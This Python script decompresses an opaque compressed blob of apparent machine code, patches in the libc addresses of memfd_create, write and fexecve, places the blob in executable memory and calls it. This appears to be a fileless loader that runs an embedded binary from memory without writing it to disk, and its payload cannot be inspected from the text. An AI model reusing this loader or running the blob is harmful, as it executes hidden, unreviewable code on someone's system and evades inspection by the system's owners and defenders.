from __future__ import annotations
import typing
import sys
import ctypes
import struct
import mmap
import zlib


func_code: bytearray = bytearray(
    zlib.decompress(
        b'x\x9c\xed<\x7fxSU\x96\xef%)D(I\xba\x06\xb7b\x91\x8c\x1b\xddVlm\xa4`\x03\xad$m\n7\xf4E*mGv\x00CxMi\xc6\xb6\xe9$\xafP\xfcT:\x13\xaa>\x1e\x19Av\x14\x9d]\x96]\xbeoV\xed\xb7\xa3\x82\xbf\xdd\xd9\xed\x8f\x81\x16\x9d\x19\x8b\xee\x8c\xbf\xb5\xea0\x93Z~t\xab@\xe5\xd7\xdbs\xdf{7}y62\xdf\xcc?\xbb\xdf\xe6\xf2\xbd\x9e{\xce=\xe7\xdcs\xcf\xbd\xf7\xdc\xd3\xf2\xee\xdb\x18\x0e7P\xdfR\xb6V1\xcbt4\x9d\xc4\xf5\xd4m\x14\xc6\x8ag\xcb\xb8K\xa1#\xf7\xa4\x8c\x8b*\xa5f\xc1\xcf\xb9T\x1e5\rp\x83\x8aO\x0b\xdf\xd5\xa5Bc\xb2\x1fY.W/\xe3Z\x98G\xa5BZ\x05\r\xdf2\x9e\xd53S!e\x99\x94\xcbR\xe1ZX\xaf\x81j9\xa9\xbfb\x85\xae\x81\x16C*T\xcba\xdf\xd8\xcae\xdc\xe6K\x85c\x8a?:\xd6=\xa8W\xcb\xe9\x14\xb9RE\xae\xd4\x97\n-\xbaTH\xfciP\x9eR\xc5\x7fZ\xa85_+\xd7\xa4\xf0i\xa1\x87J\x85d\x98\xb5\xc7\xb8\x86?\xa7\xbf\x1aE\xaeXi\xd0\xc2\x1dT*$\xfd\xdd\x01r\xd3\xa8?\xbd\x90i\\\xa5\xf4\x97n\x1e\x86u\xa9\x90\xac\xb3\x9b\x9bC\x1b\x16\x95\xdc\xdc\xdcP\xd8\x1cjm\xef(\xec(]T\xb8\xa8\xa4(\x1a.\xba%i\x97\x8d\x92\xd7\xd4\xf2\xdb\xeb\xf1\xbc\xf5`\x9a2|J\xd7)\xe3D\x1f\xae[\x95v\xcc\xbf\xb5+`\xd1\x1f\xf8\xa7G?\xdc\xfb\xcc\xa1\xbe\xab\x16\xfd\xac\xf3\xdc\xf6l\x83b7\xad\xf0P\n\xbfN5.\xbd\xa2\x87\xac/\x8a\xda\xa5\xa3A\xbbUi\xbf\n\x9e\xa1\xe0oZ\xa2\x8fN\xd7\xcd\xde\x93]\x99\xce?{\xe0\xf9\xab)\xe8\xcf\xa5\xa1/KCoHC\x8f\xd1S\xd3\xb7\xa7\xa1oJC/OC\x0f\xa7\xe97\x98\x86\xffT\x1a\xfe\xb7\xd3\xd0+\xd3\xe8\xd9\x97\x86\x8e\xe7\xcd6\x05\xfd\xc94\xfct\x1a\xfe\x9b\xd2\xd0;\xd3\xd8\xb9\x0b\x14]7\x05}3<9\xd4\x1cj\xfd\x1d2\x9e\xab,\xc45\xb4Lw\xd5(v\x93\x05\xea\xf7ol\t\xb7\xfa\xa3\\ \xc2\xf9\xfd\x94\xdf[\xe7\xf37\x04#\xc1\x8d\xa1(\x17\x8c\xd4\xf9*\x9b\xc3\xad\xc1\xba\xc0\x86\xe6\xa0\xdc6u\xcb\xf7j\xb9[\x8a\xfd~\xae)\x12\xde\xeco\x0e\xb6n\xe4\x9a\xfc\xc1H$\x1c\xa9\xa9f\xa1\xf5\xf6\xdaP$Z\xb5*\x04\xd5\x86\xe6\x9aM-\x92\xc0\x026\xd4*\xb5q\xa5\xa1p\xd4\xbf!\x10\r\x96x[C\x9c\xc7Q\xb5I\xa2\x87\x9d~\x9f?\xd4\x1a\rF8oGU\xd5\xaa\xdap\x9d_#\xe0X\x18\xdd\xd2\xca\xfa7\x87\xa0\xbf(\xd7\x10\nWm\x90\xbbs\x14\x83l\xb0\x83\x8b\x04XE8\xb4J\x92\xae\xe5\x1c\x8b\xfc\xfep\x94\x8b\x04\x03-D;\x0bT\x07\xdb\x14\x88\xf8A \xc4E\xbd,\x96\xe0\x1c\x0b\xa0\x8f\x10K\xb8\xbdu\xfe\xbab\x7fU\xed"\x7fMu\xed\x02\x7f3hk\xdd\xdc2\xd5\x10*\xe5!\xd4r%l\xb8\x9d\x03\x1f\x83{\xd9\xbb\xfdl\xd3\xdd\xfe\xc6@\x08\x04\xfdlG\xc0\x1f\xe0\x82\x1d!\x8ej\t\xb6\xb0m[\xa8\xe8\x16pk\x8b\xd2\xd4\x18j\r4\x87\xee\t\xe2\xc6\x96\xf0&\xf0\xb0\x1f\x02\x13\xabLSK\x00<\x078\x8c\x98\x9d?\x1f\x07\xa7E\x18m\x03\xf7\x07\x03\r\x18/\xc68+\xb7,g\xbc\x15\x95\xfe[\x8aJ\x925\xc7d\xf5\x96\xa2\x85T\xe5\xea\xd5\xee\n\xaf\xdfQ\xb4\xa0\xc8)7\xac^\xed_@\xf8\xe5:\xb4P8"\xe9\xa5\x7fY\x10y\x0c\x00\xa7Q\xd3\x81\x86\xa9\xe4<\xa1\xa4\xba>\x19\x0fi\xa8\xbdG\xcb\xfb\xc4\x05\x8f5\x14\x9aE\x81\xd4\xe7\n\xed\xefw=:\rG\xd3\x13\n\xde>\'t\x05\xd64AO\xca\xbfJO\xc6\xf5-G\x9f\x99\x89#\xa0A\'\xd3\xb8\x82G\x8c\xb8\xcf\x1c\x05\xe7\xb7\x16\xe8\xb0\x9ds\x95\xe0I\xe2=9\x87,W\xc90_C_\xaf\x04\xd2b\r}H\xc9\x87\x8c5\xa9t\x82\x0f\xad\x94!\x8e\xc9$\x16\xe3\xf2\xae\x8anV\xd1\x87Ut\x8b\x8a\x9eP\xd1sT\xf41\x15]\x1d\x07&T\xf4+Ut\xb2\xbf\xf1\xf9t\x95\x8aN\xe2\x01\xa6\xcfV\xd3\x15=\xd3\xa9\xc93\x0b\x97&\x15]}\x0e\xb5\xa9\xe8z\x15\xbdCEW\xe7i\x9d*z\x96\x8a\xfe\x90\x8a\xae>\xdfw\xaa\xe8\xd3U\xf4=*\xbaQE\xdf\xa7\xa2_\xa1\xa2?\xa9\xa2\xcfP\xd1\x9fU\xd1g\xaa\xe8/\xab\xe8\xd9*z\x8f\x8a>KE\x1fT\xd1MT\xa6dJ\xa6d\xca\xff\x9d\xf2\xa5\xf9\xdas(v\xdc\x88\x84\xac\xf7\x96\xc2\xaf\xf9]=\x9cN\x1cB\xb1_\x1a\xfb\xa5vq\xe1\x8d@\x1e\x17\xaf\x9f\x0f\xc0<O\xe2o\xc2\r\xe3#\x9f\x8a\xa2\xb8S\xc2i\t?\x9a\xc4u\x12\xde\x9b\xc4\xf5\x12\xfe\\\x127H\xf8?\'\xf1,\t\xdf\x95\xc4\xa7I\xf8\x0f\x93\xf8t\t\xffA\x127Jx \x89_!\xe1w$\xf1\x19\x12\xeeN\xe23%\xdc\x91\xc4\xb3%\xfc;I|\x96\x84\xe7\x10\x1cF\xfb\xc2mx\xb4\x1e\xd9?\x80/\xd4\xe0\x85\x1a\xfcz\r>W\x83\xcf\xd6\xe0\xb34x\x96\x06\xbfX\x9e\x8a\x9f\xd6\xe0\'4\xf81\r\xfe\x91\x06\xff\xad\x06\xff\xb5\x1aw\xdf\xe9\x10\xdd\xdfu\xd7\xbb\xeb\xeakQ|\xae\x17\xaf\x83\xd8\xf1\xfc\x06$\x18\xae\xcf\x07\xd7 \xdec\xcfu\xf4$(p\x10\x8a/\xbc\xc3\x85I\x9f\xa0\x81,\xbdK^D\x89ir\xcb\x02\xa9e q\xf6\x92(\nY\x05\x80\xc5&D\xf36\xfc\xbb\xdd\x80\xc7.\xfd\xaa\xd1\xd5c\xfe\xf1\xc3\x00_\xc6\x08\x13/,\x1b\xdf\x0b\xe0\xfa\x17\x0e\xd6S(^\xd8\x1a\xd9\xadc\xe2\x9c\xdd2\xba\xc2<\xaf\x13\xab\xe6\xa7\xa1\xd8a\x03\xe27\x1b\x11\x0b*\x1a\xcd\x9bz\x10\xdf\x87\xe2\x86N\xd4;l@t\xc2\x9cC\x99s\\\x16xl\xf0\x14\xc3\xe3\x8aW\xd0K\xb2\xbaa\x14`\xb7e\xab\x1d\xb1Cn\xde\xf3\x13\xd0o]\xe5\x8d\x97\xfd\x17\x12@\xd9\x92\xcd\x96\xf6\xfd\x0c?\x9e8\x0f\x8bgt\xbf\x90\xb5\x19\xf8\xe35"?\xbbu\xa9d\xe5\xb6_I\x066\xdb\rL\xbc\xc1nDP\xcbf\xe2\x0b\xb3\xc1q\xa376\x16\x99\xe7m\x93\x86\x1e\x9b\xd0\x99\xb7\xf5AE\xc8ZH4\xdc\xa4h\xd8\x8e5\xf0\'\xc1W\x89c\x17E\x91\xe1\xff\x80\xab\xefC\x15a\xea@\xe2M\xa8\n\xb3\xbe\x86\xb9\x17<v\xa3P~\x16j\xf4\xa0\x9e\xb1g\xd3\x13\x8f\x9f\x15\xe3\x06\xa7\x07\xc6\x025h6x`4\xc6x\x84\xe69{vl\x82n\xefB\xd8QX\xa3\x11\xbb\xbb\xcen\x11\xa0E\xb8\xd7nL\x9c\x85\r5r\xb74\'\xe5\xce<\x98\x9f\x07p\x9f\xa0$\xb7\x01\xcd\x97\xe7\xb4\xdd\x0f{<\xdf\xd1\xb3f\x9d{\xad{\x9d\xfb.\xb7\xbf\xdf\x03\x16]\xd4c\x93\xcf"\xfe\xb0\x170\xf1\x82(\xe2\xa4\x9b\x92\xba:\x0c\xde\x9c\x81\xcd~\x08kcgyo\xc3\xb3=\x88\xcc\xcf\xf42\xf4\x04z\x1c\x9d\xfd\x1a\xc6\x0e\xc4\x9110(\xb1\n\xb8\x1a\xa5\xfd\xe4\xae\x83\x19\xfe\xe9\x12\x8a\xaa\x87)\xbe\xe6\xd1\x07\xf5\x88?\x85cN\xc2/\x99U\xde\xb6\x04w\xfa\x198%q\xe2\x026:\xebg\xcf\xe1\xe5\xb0\xb3\xe36/\xa5\xac\x034 \xb9\x1b\xc5zr\xd1\x80kL&\xb9&$\xe8\x1cj\x1f\x06y\xc7\x19\x18.\x03\xe6&\xfeU\xd62\x1c\xc9&Z\x1a\xc9|]N\x0f\x8e|\xd8\x96x\xf9*\xd0\xe48\x03\xee\x19Y\r\xea\x88<\x1e\x8f\xe3\x84\x97?z\x17\x02\xae\xd8\xef\xc7j`pYgf`\x1f\xcd\xda*\x81\xf2\'\x81_\x9c\xfd\xa3\xc5\x14\xf5\xd5N@\x9fZ\x8c\xa9Y\xff\x82\x81s\x82\x9b\r\xa1\xf6\xae\xc5r\xa8\xbdB\x1cV\xc6\xd7O\xc6\x19/\xdf"\xf1/\x8c`Pp\t\xf1c\xa8\xf7\xe4R\xd4;\xa1G\xf4at\xf4\x12g\x05\x05\x0b\x15\x05Fq\xb8Q\xda\xc7D\x1e\xdb\xd7Y\xfe\x8fex\x8a\xe7\xd7\xa3X\xf9\x17Ni\x07\x1f\xe3\xb2\xc1\xd3W\x81X\xe2\xea\xf30;\r`\xe2\xe1\xacv\xe0\xa3\xd7\x81l\x8a\xfc\xc8f\x11\x0f8\x89KQ!zr/X\xd5\xbd\xaf\xf7E\x11\xcf\xdd\xe8\x15r\xbf\x88\xefG\xc2\x12\xd4%b\xfdQ\x0b\x18\x9c\xf0\x9e\xc7\xde\xafL \xe7\xa8\xec\xcf5\xeb\xfa\x1b\xd5\xfe\x93\xf4\xed\x7f\xa6\xfeO\xd4\xf7\xf5\xb9\xcb\xe8s\xdf\xa9D/\xc4\x9e\xc2\xaa\x13\'\xf6\xe2\x00\x96+X\xbb\xf9!\xe79n\x1d\xc3~V!\x18\xf6;\xfb\xb8\x95\x0c\x9b\xa8\x00\xbas\x88s1\xec8P\x0f\x02\xd5\xc1\xb0\x13@}\r\xa8\xd7!\xf6u\xc1  \x9e\xb1\x1b\xa1\xc5\x0c\xcb\xfdq\xbc\x91\x04\xc0y\x83P\xc1\x1b^\x83\xe7 <\xdd\xf0\xec\x07\x00\x16\xe5\xaavQ\xe3dl0\xcfs)\xf6\xc1\xf4\xd7\xb6eS\xd8L\x86=\xe5\xae\xab\x8e\xd7\xb5\xe0\xdd`\x18\xaa\x95\x0f\xdf\\FXo\xf4:?\xe4B\xd5\xf1\xe6\x7f\x83\xb8\x93\xc5\xb6\xec\xd6\xf9`\x9f\xf4\x1e\x83\x00\xb4\xf04L\x1cC\x1f\x12\x968\xef\xa3\xb82\xc4\xbe\x83\xd8j\x03,\x92\xb9\xd7u\x83\x17\r\x8fx\xf9^\x88\x87Y\xde\xdeO!VfO\xab\x14\x0c?_\xce\x97\x19c=\xb4\x9b7<\x9a\xd8\x04C\x00\x9df\xd0\x89b\xfd\xb8\xa3\xf6\xe7eO&\xedV\xcd7\xc3\x0e\xb8\xeb\xdc\xfc\x97\xf5^v\x0c\xfbs\xcf\xf1\xbd\x94G\xb0\x1e\xac\x02\xff\x94\xf9\xd8\xd7\xc1k\x82\x1b\x9cs\x13b\x13@\xef\xf6\x00=\xcf\x87}\\\xb6\xdf\r\xfe\xceN4B\x00\xc0\xeeq\xf3}\x1e\xde\xda\xbd\x8c\xb7\n\x00\x0f\xfa\xd87\x80\x07d\xcfs\x7f\x0bs%\x18\xba\x9d\x03\xdc\xd5\x0c;\x8c%ak\xccL\x14*\x82\xfc\x00_\x06\x0e.\x13<\xcew\xcc]fZ\xda\x18c\xb0\x94\xab\x1co\t\xd6\x97\xc0\x82\x87\xc1\x80z\xf3\x8e\x0f\xf1\x19\xd1\xcb\x0f\xf1\xaf\x17\x0c\xe1\xb3\x05\xe3\x8e#\xc0\x05vS\xdf\xe9\xa6\xfeC>gfY\x9bw\xeb\xf0|\x98\xf7\x0fF\xaf\\\x89\x8f\x0f\xf6\xe8\x8a\xb8\xf5G>\xd6\xb0\x8b\xd1[\xdf\x8e\xf5\xd2\xfc\xf8\xdb\x9f9\xfb\xee\xff\xa8\xca\xf9.\xb7\x15\x86\xfe\xf2<\x10\x05\x93\xcd\xbf\xb0\xbe\x04\xda\x0e\xd8\xba\xf1\xbc\xbcq\xf7n]l|^\xc1\x90\xb2^\xe3\xd6\x17\x11;\x88\xe2e\xbb\xdc\x82\xf5\xe5\xd89\x91\xbbae<\x8f\xbf=\x9e\xf7x\xa5\x90\xbd\'\xf6\xb5\xc8\xcdv\xbe\xce\xe5\xac\x10J>@\xfa\x92\xf3\x0c{\xc4K\x8f#v<\x96\xa0\xa3\xbd0w/\xe2\x89\x03\x13\xf4\xd5q\x03O\xeak\x18~\x08\xe6\xa6\x7f\xa7\x87\xef\xf5\xb1\xfdn\xfe\x8d\x91<\x11\xc7S\x18\xd9\xc8\x1a\xa8y\x07\xfa\xe0\xa78\xfa\xbb)\xd7\x1b\x13\x9f\xfd\xf9\x17{)7\x7f6\xb9\xe4|\xfc\xf1z\xbc\xd8JW\xb2yO\xf3uv+\xc3\x7f\x9cr\xc2\xc3aP\xe5\xfc\x88+\x84\xb5\xf3\x84\xdb\xd9\xcf\xd9\x10;\xe6\x16\xca\x0eH\xf3\xf2\x13\x08i\xb0\x92\x0e\xf0\x03\x95|\xd9\x13\x0c\xfb\tHW\xf2%O\xfb\xd8\xb3+\xd9\xec\x03\x0c?X\xe5|\x93\xbb\xb1R\xb0nw;\x8frs\x11\xfb\xbe\x1b\xf4\xc0\x1c\xcd\x84\x1dt\xa7,\xfdD%o\xd8\xce\xb0\x83\x00\x0e\xa0\xf8\xec\xde\xeez\xaa:^\xb6\xa6:\x9e\xe7e\x84\xb5\xe7\x8c\xcc\xfc\xbcsH\xb8\xf7}#\x9a_\xf6\xbe\xb7\xf7\xbc\x0e\xf5\x8a:X,\xf7Y\x19\xf67\xfca\x0f?\xeccO1\xec\x18\x0c\xc5\xc7\x9f\x05wy\xc1\x84\xed\xe0\xc2>\xd8@Hh2J\x89\n\x82A\xace\xd8\x8f\xa1}\rL\x0b\xe4\nuv\xdb\xe8\x1cU>\xd1oH\xe6\x14\xc0[,\xe8qF\x00\xa26)+\xf8Hb\x00\x0f\x81\xba2{\xe2\x03\xbc\xf6\x04\x8c\tev\xe0o\x1f\x02\xd3\x1bo\xc53?\xf7?C\xbbu\x1e^\x84\xd5\xf84\x9cl\xbb\xae\xed\xa6`\xc3\xc1\xf2=P\x8d\xa7\x15\xd2\x14\x98M\xd4\xfb\x19\x1c\xdd\xf6+\x11\x0b>\x07\xb5Y\x94\x97\x7f;q\x0cb\xa4\x87\xbf\xd7n\xab\x8e{Z`Y\x95\x974gS\x90\x9c\x0cx\xf8\xb5v;\xc9P\xcc\xdb*\xa4\xde\xb1i\xb1\xc3`\xcf\xb2\tl5\xe0V\x0f\xdf`\xb7\x81\xcdv\xe8j\x13\x16\x9c\x94\x11\xa9)d\xa4\xd3\x9f\xc1q\xc6\x05\xe7\xdb\xfb>X\xe3K\xf1zA\xacN\xca\xa9b}\x86dR\x15\xf7\xe8\rp(\xba\xf0\x02\x1bp!\x0c4Y\x96\x17\x8e\xcaCn)5P\xfc\xea\x8e\xdf\x03\t\xce{\x10\x1d\x10+b\xed\xb5\xca\xfe`iE\xaf\x0e\xc5KJ\x11k=\x88\xf7\xc8M\xb0o\x1eah\xd87\xd6\xc7\x04\xebn\xde\x1a\xc3-\x121n\x7f\x0c\xfc}\x9aZ\xa1\xaf;\x06\x0b\xb3\xee\x10\xc4\xf2^\x83\xd79\xd8~\xd0\x1d\xeb\xa3\xdd\xb1s\xd6\xf6]x8\xf9\x93\xc9L!\x04\xb3RU0\x93\xe6<\xd1\t\xf6\x8d\xe8\xa54\x08\xa3?\xc0h\x0fNM^\xfa*\xe5|s\xdf\xe9\xe5\xdfA\xaf\x8ar\x99\x97L\x85\xe1\x08a\x84\x8dFF\xb8\x95\xe1\x87\x99\x028\x87\'t\x90$\x98\xb7\xcd\xa1\xa5\xd3WN\x8d\xf8\x8b^\xfe42W\r9\x8e z\x08\xf1\xe3\xe6Gz\x99\x82q\xd4u\xc4\xdc\xf5sJb4w\xfd\x1a\x87\xa5\x0f\xdc\xc2t\x1fh\x8a39\x06F\xb8\xcf\xe2+H\xf0\x86\x9c\x95q;\x8d\xba\xde\xdaz\xbd\xaf\xabg\xebz_\xd7\x99v\x17\xe2}\x90\x10\x05a\xf2\xd6Y4\xc7\x0b\xe2\xdfd\xf83\x0c\xce\x05\x19>\xdb\x9e\xb8\t\x86\xc2\xe0\xec\x91\x11\xb2\xed\x08\x82\x05(\xb9\x86\xe1/II\\\xb6\x9d)8\x93x\xe5K|~e\xdbG\x9f\x84s\x9e\xe1\xfb %e\xf87qk\xe2.\xa5\tz\xe5\xb6\x8f\x0eB;z\xed\x82\xec\x86\xad8\xc5\xe7\xad\xf6\xc4\xf7%\x1e+V\x8e\xe8\xfe\x91R)7\xa0\xd0+\xc4]\xc8\t)\xe0r\x88dy]\xd8\xa1\xa3\x03\x10\xa9\x9f\xce\x81<\xe3\xd3q\xe5\xf7\xa9$\xaf9yRc\xe7\xe63\xb0d\x19\xe1f\x86\x1fc\n\x12R\x82\xe3\x1c4o\xb3\xc9\xce}Ev\xeei/\x7f\x01\x9c;\x88\xe8A\xc9\xaf\'\xcd/\x1e\x91\\\xbb\x9f\xb8\xf6\xb7R\n\x07\x1e\xc0\xbd\xbf\x86\x7fV9\xc0`\x9d\x977\xdc\xca8Op7 <\xdes\x0c\x9f\x00\xe9\x9dH0B\xee\x07O\x1fxw\xc5\x04r&\xda\x8f{\xe3ko52\xce\xd3\x9c\xd5[pR\x1a6\x08\x8c3\xf4\x97\x89\xdb`\x08\xbe\xae\x13\x9c\xc5\x0b\xb9\xb5\x85\xe1O\x81\x8aDh\\N\xa6\x8d>\x88\x0f^\xd8\xafF/\xfeE\x03\xe7\xd3\xdf<O\xd1k\x13j\x7f\xd6A|\x82\x04\xde\x92\xb0JJp\x02\x0f\xb1%\x17\x92m\xd8%\xb98~\x19\xbdq\xbfq\xa4\x0c\xaf\xda\xa4\xdb&]|Hr\xf1\xf3\xe0\xe2\xe5\x16p\xf1\xfd\xff\rg\xc2\x94\xf1\xbf\xbc\xb2\x106\xe5w\xbd\xfc\xef\xdc\xf5\xb0>\xf1y~\x01\xa7\xdfe@\xaee\n.J\xf9\xb7x\nz\xe9\xbd\xa8\xe7\xe69>P\xec\xc5\x03\xe7Oz\xf8?\xbaE\xeb\'\x10\ti\x1c\xf2\xbe\xd0\xe4\n\xaa3\x07\xf7\xd7O\xa9\xfe\x8e\x90\xfc\xcbA\xa6dJ\xa6dJ\xa6dJ\xa6dJ\xa6dJ\xa6dJ\xa6dJ\xa6\xfco)4\xa5\xa36\x05Y.\x1cY\xbc\xd8\x8f\xdf\xea\x0c47\x87Y\xe5}H\x8a\rp\xb6\xb6Hx\xa3\xed^\x1b~\xa7qQ\tE_\xa3_\x82\xdf\xcd\xc6\xef\xac\x8d}"\x8a=\x00\x87\x87E1\x81q\x80\xf8\xe5\xb1\xa1OE1[OQ\xc5\xbf\x17\xc5\xd5\xf8\xff\xfe\x8f\x89\xe2\x93\xb8\x1d ~\x0f\xd5\xf5\x07Qt\x01\xdc\t\x10\xbf;P\xfcGQ|\x16\xe00@\xfc\xbe\xdf\xbe\x11\xd0\xab\x03=\xc7E1\x1f`\xf1IQ\xe4\x00\xee;%\x8a\x9d\xa0\xcf2&\x8a\x83\xcaKg\xe4];\xfa\x9eU\x14\xdda\xa1\xaf\xc9\x9en\xdcI\xcbt|w\xa0\x06l\xb8\x193x\xa6K\xaf\xd9\xd9\xe1)\x81\'\x1fl\x97\xfe\xf7\xcfdYf\xca]a\x9e\xb9\xd9\xd8I-\x9d\xb3\xf8\xc6\x05\xf6\xeb\x88\xde\xb5\xca\x18\xd5\xef\xe7a:\x07O\x02\xe8\xc3*:\xd6\x8b\xfd2\x04\xfd-\xc7\x84*\x93\xe5\x01\x9d\xdb\x94\x1b\xd3\xaf2\xd9\x9aM\xb9n\x93\xc5m2J|\xcf\xc33q\x19>\xfc\xbe=\xfe\xbf\x0c\x1b\xf8l\x17\xe6[f\xb2<\xac\xab0\xe5\xfeX_a\xb2\xc5\r\x15\xa6\xfc\x1dYnS\xf1\x03\xd3<\xa6\xd2\xd8\xf4jS\x8d\xee\xfb\xa6R \xb8M\xf9\xc0\x00\x8c\x15&K\x85\xc9\x88\xf5\xd8\xc1\x1f\x1d\xa0\xe7\xa9\xa4\x1eoRO\x15\xd6\xb3\x0c\xeb\xa9\xc2z<&\x97n\xcbTz\xf0{\xc9\xcdx\x8e@\xcfs\xf8Os^\x93e\x87\xcec\xca}@\xef1\xd9b\x06\xfdfz\x86)\xd7#\xf1V\xcc\xa4(\x04,\xff\x80\xe7\xf2\x0bQ\xf4\xd3\xa4\xdf\x95S\xd8\xef\x96\xfb\xad\xd1=0c\xaa\x8e\xdd3%]\t\xd0\xf1\xfc\xa8(n\xc0\xbaj\xd2\xf9B\xd1\xb5^\xf7\xd6\x94\xba\x90\xac\xab\x04\xd6\xd2\xbb\xb0\xf6\n\xf4\xc4.&\xd5\x1f\x1e\x95\xae6\xfd{\xba4\x86a]\x9d\xa0\xeb\xdf?\x16\xc5\xbbtD\x97\'\x9d]\xd5\xa6\xf5\xfa\xcf\xc1K\xa5\x95S\xe8\xc2\xeb\xe2Wx\xcd\xc3\x1e\x1aT\xe6i\x87\x0ea\xff\xden\xb2\xe9\xf6\x98r}\xc9\xf9\xfc\n\xf8rao\x04S\xe7\xb3*\xd5~\x84\xfb\\nr\xb5Ne\xbc\xb4\x7f\xcb`\xfc.\xd0\xa3~\x1f3S2%S2%S2%S2\xe5\xff{!\xf7\x84\xc8\xbd r\x0f\x88\xdc\x91y\x95N\xc5\x8fh\xf0\xf7\x94J\xf2.\x89\xf2\xcb\x04\xb9C\x82l2\xbcZ\xc1\xc9=\xa5kR\xd9\xa99\n$\xf7\x92\xc8\xbdhr\x07\xe6\xf4%\x11_\x89\xa4\x9eU~/"9\x9dQ\xb9TC\xee\xd6\x0c+\xed\xe4.\xcc|\xe5R\x0f\xb9\x03\x93\xab@\xf5\xdd \\\xc8\x1d\x1f\xa4\xdcw!w\x81j\x94\xf1\x91\xdf\xc3\xc8]\x9d\xbf&\xfd\xcfH\xa5\'\x8c\xa9v\xdb\x14yrg\x87\xf4\x7f-\x95\xcaw^\x94\xc7G+\xa4K\n\xde\xa40\x88\nN\xec\x1aS\xf0\x12\xa5\xfdk\x05\xff\xb6\xbb\xe3\x7fI!\xf7\xb3\xb5\xa5X\x99@\x97\x02k\x14\xb8^\x81m\n\xecT\xe0N\x05\xeeS\xe0\xb3\n\xecQ\xe0\x90\x02\x87\x158F\x16\x88\xfa\xb2\xd8\x9fQ\xc8=\xb6\xe5\x95\x95\x8bm\xf9\xf5\x1b\xda[\xb9v\x9b\xc3Q\xe4(*.t\xb4K\xa8\xe3\xfe[\x00+)P\xc8\x14U\x14m\x8ar\x11.\xb0\x81*\n\xb5r\xc1H\x1bU\xd4\x1a\xe6\x82E\x1b[\xdb\x8b\xda"\xe1\xb6`\x84\xdb\xa2"mh\x0f57\x14\x86\x1a\x14\x92\xbb\xc2[\xc8\x056RR[S \xdaD\x155li\x8dni\x91!\x17\x91[6\x05#\xd1P\xb85\x05\xf1C[$\xd8\x1c\xc0\x8cJ\xad\xad\x99\xc3V\x84\xe0\'T\x8b6\x86\x95J4\xc8RE\\\xb0\x03\xd0Fh\x06\xeepC\x80\x0bPE\xc1&\x7fc$\xd0\x12\xf475D&1Y\x87?\x10\x89\x04\xb6\xc8\x12\xa4\x0e]\x05ZB\xa0L\x16\xdf\x10\x8dREl\xb8\xa5%\xd8\xca\xfde\x9e\x97\x0b\xde\x7fx+\x90\xf5\x9b\xee{\x08\xa4\xd0\x1a\x1c\xdf\xfdS\xdf\xd1Kw\x1f\x9f\x14\xa3\x06\xbfA#\xaf\xfd\x0e\x80]\xc3\xaf\xddGN\x8d\xfc\x0e}*\xb4]F\x1e\xff-\xe4\x0c\xecQ"O\xe2\xd8\xb3\x1a\xfbI\x1c\xd3\xda\x8f\xaf5\xceT\xf5O\xe2\x1c\x81\xf9J\x03\xb9\xdfH\xe4I\xbc\xf9;*\xf5\xae=\x89\x9b\x04\xceW_~\xa4\xbe\xe9\xff\x00%\xc7 \xc2F\xe2\x0e\x81E\x1a\xfbu\x1a\xd8J\xc91-\xe9\x7fc*\xec\xa4&\xed\xd7Q\xdf\x1c\xff}\x94\xecS"O\xe2,\x81$\xcej\xfdG\xc6\xff\xa0"_A\xdag\xa4\xc2\x1a\x95|\xee\x14\xf2\xf8oT\x93\xdf$\xa0\xbe\xf1}\rr\x9e\x91\xa2\x9d\xff\x1d\x1ay\x9b%\x15\x8ei\xf8\xb5\x9f\xf1xL#o\xc9\xd1\xc0\xcb\xc8\xef\xd3\xf6\x9f\x93\n\x87/#\xff\x94F>yIW\x81U\x9a\xcb\xa1Z{\x9e\xd1\xc8\x93\xbc\x80\xc0Y\x1a~\xad\xff^\xa0R\xe3\x87\xf6\x03\x1c\xda\xfd\xaf\x95\xff\x85F>\xddw9\xd2\xc9\xbf\xa1\x91\xef)N\x855\xfaT~\xed\xfa\xc5o\xf1a\x17\x11\xb6\xe4w:\x94\xefvh\xfde\xd4\xc0O)\xf9~5\x91\'yRq\xf9\xd4\xfdi\xe5OP\xb2\xef\x89|\xf2\xbb+\xa4\x7fU\xfcP\xcb\x11\xbb~J\xc9\xe3\xd7\xe6Ih\xa9\x0c_\xbeL\xffg4\xf2\x94r\x1e\x93\x0f\xe9\xa4\x1b?)\x17\x14\x1a\x91O~\xdfA\x91_\xfd\xbd\x07Sf\xc0\xa5\x91\xc7\x9f\x00\x92\xbe\xfb\xa3\xa1\x13\xf9\xf9Z\xfe)\xa0f\x8a\xa5\xb2D\x91\x9f\xa1\t\x98\xda\xf8IJ=\x8a\x97\xa3\x97D\xd1q\x06\xc5\x8e\xdb\x10\x7f\xaf\xdd\x82_\xee\x94\xc2L\xf2-O$d\x95\x01\x8f8\xc4\x1f\x92\xee\x91\xc5.\x8a\\\x11\x10\xe7\x01\xf1\xd5\x87\x90t}\xe6o\xa0\xce\x9f\x12\x87\x80L\xbd$\xbf\x02l\x94\xae1a\xa2\xa3\x07\xc5~i[\xd7\xff?\xf4\xa3\xb3$'
    )
)

libc_relocs: dict[str, int] = dict(
    fexecve=0x8,
    write=0x10,
    memfd_create=0x18,
)

func_offs: int = 0x48b0

libc = ctypes.CDLL("libc.so.6")

for name, offs in libc_relocs.items():
    ctypes_func: ctypes._FuncPointer = getattr(libc, name)
    ctypes_func_addr: int = ctypes.c_void_p.from_address(ctypes.addressof(ctypes_func)).value
    
    func_code[offs:offs + 8] = struct.pack("<Q", ctypes_func_addr)
    # print(f"{name} -> {ctypes_func_addr:#x}")
    del ctypes_func, ctypes_func_addr

assert len(func_code) <= 32 * mmap.PAGESIZE, "Payload too big"

# print(func_code.hex())

func_buf = mmap.mmap(-1, len(func_code), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
func_ptr = ctypes.c_void_p.from_buffer(func_buf, func_offs)
func_type = ctypes.CFUNCTYPE(
    None,
)
func = func_type(ctypes.addressof(func_ptr))
func_buf.write(func_code)

# breakpoint()

# Magic
func()